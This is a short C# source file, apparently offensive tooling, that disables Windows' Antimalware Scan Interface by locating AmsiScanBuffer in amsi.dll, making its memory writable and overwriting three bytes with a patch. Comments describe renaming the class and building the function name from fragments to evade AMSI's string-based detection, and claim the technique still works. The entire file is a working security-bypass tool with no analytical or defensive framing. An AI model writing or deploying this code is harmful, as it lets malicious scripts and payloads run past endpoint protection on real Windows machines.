using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Bypass
{
    // Original class name was AMSI, which was also detected via String matching.
    public class BP
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static int Disable()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve amsi.dll pointer.");
                return 1;
            }

            // AMSI detects loading AmsiScanBuffer.dll with string matching, building at runtime fixes
            StringBuilder sb = new StringBuilder();
            sb.Append("Am");
            sb.Append("si");
            sb.Append("Sc");
            sb.Append("an");
            sb.Append("Buf");
            sb.Append("fer");

            IntPtr AmsiScanBufferPtr = GetProcAddress(TargetDLL, sb.ToString());
            if (AmsiScanBufferPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve AmsiScanBuffer function pointer");
                return 1;
            }

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufferPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not change AmsiScanBuffer memory permissions!");
                return 1;
            }

            /*
             * This is a new technique, and is still working.
             * Source: https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
             */
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufferPtr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("AmsiScanBuffer patch has been applied.");
            return 0;
        }
    }
}